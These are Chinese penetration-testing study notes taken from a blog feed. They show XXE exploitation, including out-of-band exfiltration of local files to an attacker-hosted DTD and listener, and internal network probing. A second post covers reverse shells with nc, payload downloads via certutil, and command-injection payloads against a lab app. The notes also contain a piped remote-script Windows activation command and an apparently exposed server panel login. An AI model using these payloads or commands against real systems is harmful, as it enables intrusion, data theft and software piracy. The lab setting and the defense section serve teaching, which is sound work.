alt="image-20240530113037168"></p><p>从w3school给出的例子，我们也大概知道了CDATA的使用方式，但是其还需要注意几点：</p><pre><code>a&gt; CDATA 部分不能包含字符串 &quot;]]&gt;&quot;。也不允许嵌套的 CDATA 部分，这样会导致异常的闭合，从而使解析器报错。b&gt; 标记 CDATA 部分结尾的 &quot;]]&gt;&quot; 不能包含空格或换行。</code></pre><p>那么了解了这些，我们就可以尝试使用CDATA再次去读取目标文件的内容，我们首先需要把要读取的到的内容放在CDATA中，但是CDATA并没有提供拼接的方法，所以我们需要去尝试，我们这里暂且使用普通实体进行拼接尝试<strong>（注意是尝试）</strong>：</p><pre><code class="xml-dtd">&lt;!DOCTYPE root [   &lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;   &lt;!ENTITY end &quot;]]&gt;&quot;&gt;]&gt;&lt;root&gt;&amp;start;&amp;xxe;&amp;end;&lt;/root&gt;</code></pre><p>我们的想法是这样的，将CDATA的格式内容写在start和end两个实体里面，然后在调用实体的时候，先后调用三个实体，将实体内容进行拼接，拼接后的内容被XML解析器解析。但是测试失败：</p><p><img src="/../image/image-20240530113409608.png" alt="image-20240530113409608"></p><p>这说明我们的拼接方式不可行，我们现在使用的是一般实体，我们在前面的xml基础知识中介绍过了，一般实体的引用是在xml文档内容中，既然在xml文档内容中拼接不可行，那在dtd中拼接可行吗？我们再次进行尝试，既然再dtd中拼接，那就需要用到参数实体了。</p><p>我们再次尝试构造payload：</p><pre><code class="xml-dtd">&lt;!DOCTYPE root [   &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;   &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;   &lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;]&gt;&lt;root&gt;&amp;all;&lt;/root&gt;</code></pre><p><img src="/../image/image-20240530113535516.png" alt="image-20240530113535516"></p><p>理论上，我们完美地将这几个参数实体拼接了起来，并将值赋给了一般实体all，但是遗憾的是，我们的payload还是报错了：</p><p>那么这又是为什么呢？根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语言中”，这是什么意思呢？就是不能在实际的标记语言中来调用参数实体，像我们这样，就是在标记语言中进行调用，他需要在DTD中单独来调用：</p><p><img src="/../image/image-20240530113612099.png" alt="image-20240530113612099"></p><p>规范中，还说到：“但可以在同级别中被当作标记语言调用” ，就像是参数实体的引用，就是将调用当成了一个标记语言，也就是我们前面说的需要在DTD中单独调用，像这样：</p><p><img src="/../image/image-20240530113618932.png" alt="image-20240530113618932"></p><p>也就是我们所构造的payload这种使用方式，不能在内部DTD中被这样使用，但是幸运的是，XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来：</p><p><img src="/../image/image-20240530113636226.png" alt="image-20240530113636226"></p><p>这就要求我们作为攻击者，需要有一台服务器来提供外部的恶意DTD文件的读取，我们实验环境中就用一个机器来同时作为攻击机和受害机，效果一样的。</p><p>DTD文件的内容：</p><pre><code class="xml-dtd">&lt;!ENTITY evil &quot;%start;%xxe;%end;&quot; &gt;</code></pre><pre><code class="xml-dtd">&lt;!DOCTYPE root [   &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;   &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;   &lt;!ENTITY % all SYSTEM &quot;http://192.168.0.3/evil.dtd&quot;&gt;   %all;]&gt;&lt;root&gt;&amp;evil;&lt;/root&gt;</code></pre><p><img src="/../image/image-20240530114154563.png" alt="image-20240530114154563"></p><p>这是因为，漏洞示例代码中的打印函数选的不好，print_r()函数在遇到这种内容中有导致标签闭合的字符串时，就会返回出空的SimpleXMLElement对象。我们可以做如下测试，编辑如下php代码（已经存在于step2路径下print_test.php和网站根目录下index.php）：</p><pre><code class="php">&lt;?php##echo &quot;Hello World&quot;;$xml=&lt;&lt;&lt;XML&lt;?xml version=&#39;1.0&#39;?&gt;&lt;!DOCTYPE root [   &lt;!ENTITY start &quot;&lt;![CDATA[&#39;&lt;&gt;!@#!$&#39;]]&gt;&quot;&gt;]&gt;&lt;root&gt;&amp;start;&lt;/root&gt;XML;$xxe_ = simplexml_load_string($xml);print($xxe_);echo &quot;----------------------------&quot;;echo $xxe_;echo &quot;----------------------------&quot;;print_r($xxe_);?&gt;</code></pre><p><img src="/../image/image-20240530114316095.png" alt="image-20240530114316095"></p><p>可见，唯独print_r()，没有输出这些特殊的字符串。这种情况，如果漏洞代码中使用的是echo，就可以输出了。感兴趣的同学可以自己修改代码来验证。</p><p>Ps：</p><p>由于环境资源的关系，我们在进行攻击时，所使用的外部dtd文件，是本地环境的。但是在实际的攻击情况下，这个DTD文件应该是我们自己所掌握的主机的DTD文件，文件的内容是受我们所控的。</p><h3 id="无回显的本地文件读取"><a href="#无回显的本地文件读取" class="headerlink" title="无回显的本地文件读取"></a>无回显的本地文件读取</h3><p>（OOB out-of-band 外带参数实体注入）</p><p>在实际情况中，大多数情况下服务器上的 XML 并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据</p><p>先看一下漏洞示例（已经在桌面demo&#x2F;PHP_XML&#x2F;step3&#x2F;out_xxe.php和网站根目录下out_xxe.php）：</p><pre><code class="php">&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&#39;php://input&#39;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);?&gt;</code></pre><p>相较于前面有回显的漏洞代码，主要功能没有大的变化，但是代码中没有内容输出的部分。这样，用之前的payload就没有作用了（当然这个任务中的漏洞示例代码，加个输出，也同样适用于前面的任务）。</p><p>那么怎样才能成功读取到内容呢，我们可以这样进行Payload的构造：</p><p>有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：</p><p>我们可以在本地做一个端口监听，然后利用payload来从目标主机读取到文件内容后，将文件内容作为url的一部分来请求我们本地监听的端口，这样，我们只需要查看请求的url就可以知道读取到的内容是什么。</p><p>首先，我们使用ncat监听一个端口：</p><pre><code>ncat -lvvp 3333</code></pre><p>然后，我们构造payload：</p><p>我们选择使用外部DTD，在我们自己所能掌控（或是自己搭建）的主机上编写一个dtd文件（实验环境中，就是我们所使用的这台机器），我在这里命名为evil_xxe.dtd：</p><p>(已经在桌面demo&#x2F;PHP_XML&#x2F;step3&#x2F;evil_xxe.dtd和网站根目录下evil_xxe.dtd)</p><pre><code class="xml-dtd">&lt;!ENTITY % xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/Users/Administrator/Desktop/xmlerror.txt&quot;&gt;&lt;!ENTITY % dtd &quot;&lt;!ENTITY send SYSTEM &#39;http://192.168.0.3:3333/?%xxe;&#39;&gt;&quot;&gt;%dtd;</code></pre><p>第一个参数实体的声明中使用到了php的伪协议，将需要读取的内容进行base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。</p><p>然后第二个参数实体，对我们监听的主机和端口进行访问，并将读取到的参数实体xxe的内容作为请求的参数。</p><p>这样，Payload就会很简单了：</p><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root SYSTEM &quot;http://192.168.0.3/evil_xxe.dtd&quot;&gt;&lt;root&gt;&amp;send;&lt;/root&gt;</code></pre><p>bp抓包,加入payload</p><p><img src="/../image/image-20240530115304630.png" alt="image-20240530115304630"></p><p>然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串：</p><p><img src="/../image/image-20240530115450922.png" alt="image-20240530115450922"></p><p>Ps：</p><p>有时候也会出现报错的情况，一方面我们在漏洞的代码中没有屏蔽错误和警告，另一方面如果我们监听的端口失效，当目标服务器尝试访问我们监听的端口，但失败的时候，就会爆出错误和警告，但是也可以从爆出的警告中看到我们需要的信息。</p><p><img src="/../image/image-20240530115518077.png" alt="image-20240530115518077"></p><h3 id="XXE其他利用方式"><a href="#XXE其他利用方式" class="headerlink" title="XXE其他利用方式"></a>XXE其他利用方式</h3><p>当然进行内网探测我们还需要做一些准备工作，就是获取目标主机在内网中的IP地址，或是内网的网络划分信息，我们可以先利用 file 协议读取我们作为跳板服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 等跟内网配置有关的文件，我们可以通过这些文件的内容来获取更多有关内网的信息。</p><p>如果实在没有办法获取目标主机的内网配置相关信息，，，那就花费时间爆破吧。</p><p><strong>内网存活主机探测：</strong></p><p>如下，其实payload就是简单的一个外部实体的注入payload：</p><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root SYSTEM &quot;http://192.168.0.3/&quot;&gt;&lt;root&gt;&amp;send;&lt;/root&gt;</code></pre><p><img src="/../image/image-20240530115905642.png" alt="image-20240530115905642"></p><p>只不过是将http:&#x2F;&#x2F;后面的部分替换为目标主机，这样当目标主机存活时，如果80端口没有对应的服务，那么很快就会i发现警告信息，如上图。</p><p>那如果目标主机不存在，那么我们所利用的XXE漏洞的服务器，就会花费一些时间在网络总寻找目标主机，直到超时。如下图：</p><p><img src="/../image/image-20240530120058731.png" alt="image-20240530120058731"></p><p>如果觉得手动的探测慢的话，当然可以自己编写一个脚本来进行自动探测，将没有超时的主机记录下来即可。</p><p><strong>内网主机端口探测：</strong></p><p>同样的，根据内网存活主机的扫描方式，我们也可以针对某个主机进行端口的扫描。但是端口的探测准确性比较低，判断的标准也不一样。由于环境的不同，版本的不同，你可能会遇到任何一个端口的返回都是200状态码和警告信息以及我们期望输出的字符串，那么这个时候哪些端口是打开的，哪些端口是关闭的，就需要你自己去判断了。</p><h2 id="通过XXE漏洞进行命令执行（非本实验重点）"><a href="#通过XXE漏洞进行命令执行（非本实验重点）" class="headerlink" title="通过XXE漏洞进行命令执行（非本实验重点）"></a><strong>通过XXE漏洞进行命令执行（非本实验重点）</strong></h2><p>这种情况比较少见，所需的前提条件除了真实存在XXE漏洞外，大概还需要：</p><pre><code>a&gt; 目标系统为Linux系统b&gt; 目标系统成功安装PHP的expect扩展</code></pre><p>而且这个漏洞所执行的命令也有限制：</p><pre><code>a&gt; 可执行的命令与当前用户的权限大小有关b&gt; 命令中不能有空格，否则会报错</code></pre><p>一般情况下payload（实验环境限制，我们的环境时windows环境，没有进行测试，大家可以在自己的本地搭建Linux环境测试）：</p><p><img src="/../image/image-20240530120038746.png" alt="image-20240530120038746"></p><h4 id="通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。"><a href="#通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。" class="headerlink" title="通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。"></a><strong>通过XXE漏洞进行DOS攻击<strong><strong>（不要轻易尝试，当然，也可能现在已经没有效果了）</strong></strong>。</strong></h4><p>Payload如下：</p><p><img src="/../image/image-20240530120031896.png" alt="image-20240530120031896"></p><p>上面的payload就是著名的“billion laughs”攻击，该代码可以在目标主机的内存中生成十亿个“lol”字符串，从而导致 Dos攻击。它也被称为指数实体扩展攻击，是一种名副其实的XML炸弹。原理为：通过创建一项递归的 XML 定义，构造恶意的XML实体文件耗尽可用内存，如以上代码所示，在XMl中定义了一个实体lol9，它的值包含了十个实体lol8的值，而每个lol8又包含了十个lol7的值…最后产生10亿个“lol”字符串，占用内存约高达3GB。因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，这样，就会占用大量的内存资源，造成了拒绝服务器攻击。</p><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a><strong>方案一：</strong></h4><p>过滤用户输入的xml数据，比如尖括号，一些关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC等</p><h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a><strong>方案二：</strong></h4><p>禁用外部实体：</p><p>PHP：</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>JAVA:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python：</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xd</title>
      <link href="/2024/05/29/xd/"/>
      <url>/2024/05/29/xd/</url>
      
        <content type="html"><![CDATA[<h1 id="Day1-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#Day1-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="Day1:操作系统-名词-文件下载-反弹SHELL-防火墙绕过"></a>Day1:操作系统-名词-文件下载-反弹SHELL-防火墙绕过</h1><p><strong>前后端，POC&#x2F;ExP，Payload&#x2F;shellcode，后门&#x2F;webshe1l，木马&#x2F;病毒反弹，回显，跳板（科学上网），黑白盒测试（不知道&#x2F;知道源代码），暴力解，社会工程学，撞库，ATT&amp;CK]<a href="https://attack.mitre.org/%E7%AD%89%E5%8F%82%E8%80%83">https://attack.mitre.org/等参考</a>:</strong></p><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p><a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p><p>术语解释：<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p><h2 id="1-渗透测试常用专业术语"><a href="#1-渗透测试常用专业术语" class="headerlink" title="1.渗透测试常用专业术语"></a>1.渗透测试常用专业术语</h2><h3 id="1-1-POC、EXP、Payload与Shellcode"><a href="#1-1-POC、EXP、Payload与Shellcode" class="headerlink" title="1.1. POC、EXP、Payload与Shellcode"></a>1.1. POC、EXP、Payload与Shellcode</h3><blockquote><p>POC:全称’ProofofConcept’，中文’概念验证”，常指一段漏洞证明的代码。</p><p>EXP:全称’Exploit”，中文‘利用’，指利用系统漏洞进行攻击的动作。</p><p>Payload:中文’有效载荷’，指成功exploit之后，真正在目标系统执行的代码或指令</p><p>shellcode:简单翻译”shell代码’，是Payioad的一种，由于其建立正向&#x2F;反向shell而得名</p></blockquote><p><strong>注意：</strong></p><ol><li>POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Ep通常是有害的，有了POC，才有EXP。</li><li>Payload有很多种，它可以是Shelcde，也可以直接是一段系统命令。同一个Payoad可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP</li><li>Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</li></ol><h3 id="基础案例1"><a href="#基础案例1" class="headerlink" title="#基础案例1:"></a>#基础案例1:</h3><p><strong>操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</strong></p><ul><li>1、个人计算机&amp;服务器用机</li><li>2、windows&amp;Linux常见命令</li><li>3、文件权限&amp;服务权限&amp;用户权限等</li><li>4、系统用户&amp;用户组&amp;服务用户等分类</li><li>5、自带防火墙出站&amp;入站规则策略协议</li></ul><h3 id="实用案例1"><a href="#实用案例1" class="headerlink" title="#实用案例1:"></a>#实用案例1:</h3><p><strong>文件上传下载-解决无图形化&amp;解决数据传输</strong><br>Linux:wget curl python ruby perl java等</p><p>Windows: PowerShell Certutil Bitsadmin msiexec mshta rundl132</p><p>在服务器上准备好nc.exe</p><p><img src="/../image/image-20240318173257483.png" alt="image-20240318173257483"></p><p>再通过访问该地址，下载nc到本机</p><p><img src="/../image/image-20240318173450975.png" alt="image-20240318173450975"></p><p>或者用curl命令</p><pre><code>curl http:192.168.174.143/nc/nc.exe -o nc2.exe</code></pre><p><img src="/../image/image-20240318173743501.png"></p><h3 id="实用案例2"><a href="#实用案例2" class="headerlink" title="#实用案例2:"></a>#实用案例2:</h3><p><strong>反弹shell命令-解决数据回显&amp;解决数据通讯</strong></p><p>useradd 用户名 passwd 用户名</p><p>测试linux系统添加用户或修改密码命令交互回显问题</p><p> 这里我一个用windows10作为本机，centos7作为服务器</p><p>windows：192.168.174.143</p><p>centos：192.168.174.142</p><p>首先在centos设置监听</p><pre><code>nc -lvvp 5566</code></pre><p>然后在windows10用nc把cmd弹过来</p><pre><code>nc -e cmd 192.168.174.142</code></pre><p><img src="/../image/image-20240318191948435.png" alt="image-20240318191948435"></p><p>也能成功就是会乱码</p><p><img src="/../image/image-20240318192011869.png" alt="image-20240318192011869"></p><p>如果是虚拟机就把cmd改为&#x2F;bin&#x2F;bash</p><p>但这个只是在内网的情况下，如果需要连接外网，我们需要用到路由的端口转，详细见Day2</p><h3 id="结合案例1"><a href="#结合案例1" class="headerlink" title="#结合案例1:"></a>#结合案例1:</h3><p>防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</p><p>1、内网:<br>内网 -&gt; 服务器</p><p>服务器!-&gt;内网</p><p>2、防火墙:<br>服务器&lt;-&gt; aliyun</p><p>服务器防火墙-&gt; aliyun</p><p>aliyun !-&gt; 服务器防火墙</p><p>关键就是防火墙会拒绝外部进来的数据，所以内部就监听不到东西，这时候如果把windows给到服务器，这时候就变成出站了，限制就没那么严格</p><p><img src="/../image/image-20240318193645056.png" alt="image-20240318193645056"></p><p>正向，就是我主动找你，把我的cmd给你</p><p>反向，对方来找我，把它的cmd给我</p><p>对windows来说是正向，对linux是反向，因为是windows找linux，要看是以谁为参照物</p><h3 id="结合案例2"><a href="#结合案例2" class="headerlink" title="#结合案例2:"></a>#结合案例2:</h3><pre><code>#python2一句话服务器python -m SimpleHTTPServer 8080#python3python -m Http.server 8080</code></pre><p><strong>学会了有手就行-Fofa拿下同行Pikachu服务器</strong></p><p>这个没有自己的服务器，没办法上传，就本地的靶场试试</p><p>文件下载&amp;反弹she11:<br>certutil -urlcache -split -f <a href="http://192.168.174.143/nc/nc.exe">http://192.168.174.143/nc/nc.exe</a> nc -e cmd 192.168.174.142 5566</p><p><img src="/../image/image-20240318201521348.png" alt="image-20240318201521348"></p><pre><code>127.0.0.1 &amp; certutil -urlcache -split -f http://192.168.174.143/nc/nc.exe127.0.0.1 &amp; dir127.0.0.1 &amp; nc -e cmd 192.168.174.142 5566</code></pre><p><img src="/../image/image-20240318202023597.png" alt="image-20240318202023597"></p><p><img src="/../image/image-20240318202040571.png" alt="image-20240318202040571"></p><p><img src="/../image/image-20240318202107378.png" alt="image-20240318202107378"></p><h1 id="Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="Day2:Web应用_架构搭建_漏洞_HTTP数据包_代理服务器"></a>Day2:Web应用_架构搭建_漏洞_HTTP数据包_代理服务器</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="#知识点:"></a>#知识点:</h2><ol><li>网站搭建前置知识</li><li>WEB应用环境架构类</li><li>WEB应用安全漏洞分类</li><li>WEB请求返回过程数据包</li></ol><h2 id="网站搭建前置知识"><a href="#网站搭建前置知识" class="headerlink" title="#网站搭建前置知识"></a>#网站搭建前置知识</h2><p>域名，子域名，DNS，HTTP&#x2F;HTTPS，证书等</p><blockquote><p>一、什么是主域名？</p><p>主域名由两个或两个以上的字母构成，中间由点号隔开，整个域名通常只有1个点号。 百度的主域名是baidu.com。<br>二、什么是子域名？</p><p>子域名一般会根据站点不同性质在主域名前面加上不同的前缀构成，通常比主域名多一个点或两个点。只要在主域名前面加上前缀的都是该主域名的子域名，子域名又能分为二级子域名、三级子域名、还有多级子域名。 子域名会在主域名前面加上不同的前缀，通常比主域名多一个点或两个点。只要在主域名前面加上前缀的都是该主域名的子域名，子域名又能分为二级子域名、三级子域名、还有多级子域名。</p><p>例如：百度的二级域名（子域名）<a href="http://www.baidu.com/">www.baidu.com</a> 如1.<a href="http://www.baidu.com和2.www.baidu.com这样的三级域名也同样可以成为www.baidu.com和baidu.com的子域名./">www.baidu.com和2.www.baidu.com这样的三级域名也同样可以成为www.baidu.com和baidu.com的子域名。</a></p></blockquote><p><strong>国内的域名需要备案才能被访问，否则只有非大陆地区才能访问</strong></p><p><img src="/../image/image-20240319181055521.png" alt="image-20240319181055521"></p><h3 id="一键部署Zblog"><a href="#一键部署Zblog" class="headerlink" title="一键部署Zblog"></a><strong>一键部署Zblog</strong></h3><p><img src="/../image/image-20240319225656061.png" alt="image-20240319225656061"></p><p><img src="/../image/image-20240319230124584.png" alt="image-20240319230124584"></p><p><img src="/../image/image-20240319230134261.png" alt="image-20240319230134261"></p><h2 id="WEB应用环境架构类"><a href="#WEB应用环境架构类" class="headerlink" title="#WEB应用环境架构类"></a>#WEB应用环境架构类</h2><p>理解不同WEB应用组成角色功能架构:</p><p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等</p><p>开发语言:asp,php,aspx,jsp,java,python,ruby,go,html,javascript等</p><p>程序源码:根据开发语言分类;应用类型分类;开源CMS分类;开发框架分类等</p><p>中间件容器:IIS,Apache,Nginx,Tomcat,weblogic,Jboos,glasshfish等</p><p>数据库类型:Access,Mysql,Mssql,0racle,db2,Sybase,Redis,MongoDB等</p><p>服务器操作系统:windows系列，Linux系列，Mac系列等</p><p>第三方软件:phpmyadmin,vs-ftpd,VNC，chibpenssh等</p><h2 id="WEB应用安全漏洞分类"><a href="#WEB应用安全漏洞分类" class="headerlink" title="#WEB应用安全漏洞分类"></a>#WEB应用安全漏洞分类</h2><p>SQL注入，文件安全，RCE执行，Xss跨站，CSRF&#x2F;SSRF&#x2F;CRLF，反序列化，逻辑越权，未授权访问，XXE&#x2F;XML，弱口令安全等</p><blockquote><p>面板地址:<a href="http://60.205.125.117:8888/3d189822">http://60.205.125.117:8888/3d189822</a><br>用户名:msdiqfwn<br>密码:c10a904a</p></blockquote><h2 id="WEB请求返回过程数据包参考"><a href="#WEB请求返回过程数据包参考" class="headerlink" title="#WEB请求返回过程数据包参考"></a>#WEB请求返回过程数据包参考</h2><p><a href="https://www.jianshu.com/p/558455228c43">https://www.jianshu.com/p/558455228c43</a></p><p><a href="https://www.cnblogs.com/cherrycui/p/10815465.html">https://www.cnblogs.com/cherrycui/p/10815465.html</a></p><p>请求数据包，请求方法，请求体，响应包，响应头，状态码，代理服务器等</p><p>Request,Response,User-Agent,Cookie,Server,Content-Length等</p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>架构-Web应用搭建-域名源码解析</p><p>请求包-新闻回帖点赞-重放数据包</p><p><img src="/../image/image-20240319205949190.png" alt="image-20240319205949190"></p><p>点赞抓包，发送到重放模块</p><p><img src="/../image/image-20240319210012855.png" alt="image-20240319210012855"></p><p>不断发送，使得本来只能点一次的赞，能够点多次</p><p><img src="/../image/image-20240319210241684.png" alt="image-20240319210241684"></p><p>请求包-移动端&amp;PC访问-自定义UA头</p><p>这里我们分别用电脑和手机模拟器访问bing搜索</p><pre><code class="markdown">电脑GET /?mkt=zh-CN&amp;mkt=zh-CN HTTP/1.1Host: www.bing.com...User-Agent: Mozilla/5.0 (**Windows NT 10.0**; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Dest: documentReferer: https://cn.bing.com/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9手机Mozilla/5.0 (Linux; **Android** 7.1.2; HD1900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36</code></pre><p>可以看到他会显示不同的系统,然后可以通过替换这个User-Agent来实现在电脑端访问手机端样式的界面</p><p><img src="/../image/image-20240319222851169.png" alt="image-20240319222851169"></p><p>返回包-网站文件目录扫描-返回状态码</p><p>文件夹 403 存在 404 不存在 </p><p>文件 200 存在 404 不存在</p><p>3xx 跳转 处置过程 判断可有可无</p><p>5xx 内部错误 服务器问题 判断可有可无</p><p>所以可以在bp里，设置如下参数，然后用列表等扫描</p><p><img src="/../image/image-20240319224355849.png" alt="image-20240319224355849"></p><p>然后根据状态码来确定是否存在</p><p><img src="/../image/image-20240319224536900.png" alt="image-20240319224536900"></p><p>也是一种目录扫描的方法</p><p>数据包-WAF文件目录扫描-代理服务器</p><p>快代理<a href="https://www.kuaidaili.com/free/%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%AD%90%E5%8F%AF%E4%BB%A5%E8%AE%A9%E4%BD%A0%E7%9A%84ip%E4%BD%8D%E7%BD%AE%E5%8F%98%E5%BE%97%E4%B8%8D%E7%A1%AE%E5%AE%9A%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E7%9A%84ip%E8%A2%AB%E6%8B%89%E9%BB%91%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%BF%99%E4%B8%AA%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%A7%A3%E5%86%B3">https://www.kuaidaili.com/free/，这样子可以让你的ip位置变得不确定，如果你的ip被拉黑可以通过这个方式来解决</a></p><h1 id="Day3-抓包-封包-协议-APP-小程序-PC应用-WEB应用"><a href="#Day3-抓包-封包-协议-APP-小程序-PC应用-WEB应用" class="headerlink" title="Day3:抓包 封包 协议 APP 小程序 PC应用 WEB应用"></a>Day3:抓包 封包 协议 APP 小程序 PC应用 WEB应用</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="#知识点:"></a>#知识点:</h2><ul><li>抓包技术应用意义</li><li>抓包技术应用对象</li><li>抓包技术应用协议</li><li>抓包技术应用支持</li><li>封包技术应用意义</li><li>总结点:学会不同对象采用不同抓包封包抓取技术分析</li></ul><p>基于网络接口抓包-网络接口</p><p>基于程序进程抓包-程序进程</p><p>基于数据协议抓包-HTTP&#x2F;S&amp;TCP&amp;UDP</p><p>基于应用对象抓包-APP&amp;小程序&amp;PC UI</p><p>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX</p><h3 id="win10激活"><a href="#win10激活" class="headerlink" title="win10激活"></a>win10激活</h3><pre><code>powershellirm https://massgrave.dev/get |iex弹出来的命令窗，选，是然后出来的窗口，在下面输入：1，回车等待激活</code></pre><h2 id="参考点"><a href="#参考点" class="headerlink" title="#参考点:"></a>#参考点:</h2><p><strong>Fiddler:</strong></p><p>是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据(指cookie,html，js,css等文件)。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式。</p><p><strong>charles：</strong></p><p>是一个HTTP代理服务器,HTTP监视器,反转代理服务器，当浏览器连接charles的代理司互联网时，Charles可以监控浏览器发送和接收的所有数据。它允许一个开发者查看有连接互联网的HTTP通信，这些包括request，response和HTTPheaders(包含ookies与caching信息)</p><p><strong>TCPDump:</strong></p><p>是可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信<br>志。</p><p><strong>BurpSuite:</strong></p><p>是用于攻击web 应用程序的集成平台，包含了许多工具。Burp suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><p><strong>wireshark:</strong></p><p>是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。wireshark使用winecAP作为接口，直接与网卡进行数据报文交换。</p><p><strong>科来网络分析系统:</strong></p><p>是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题。</p><p><strong>WPE&amp;封包分析:</strong></p><p>是强大的网络封包编辑器，wpe可以截取网络上的信息，修改封包数据是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。</p><h2 id="演示案例-1"><a href="#演示案例-1" class="headerlink" title="演示案例:"></a><strong>演示案例:</strong></h2><p>WEB应用站点操作数据抓包-<strong>浏览器审查</strong>查看元素网络监听</p><p>APP&amp;小程序&amp;PC抓包HTTP&#x2F;S数据-Charles&amp;Fiddler&amp;Burpsuite</p><p>程序进程&amp;网络接口&amp;其他协议抓包-WireShark&amp;科来网络分析系统</p><p>这两个是可以抓到更多的协议的数据包</p><p>通讯类应用封包分析发送接收-WPE四件套封包&amp;科来网络分析系统</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="环境配置-1"><a href="#环境配置-1" class="headerlink" 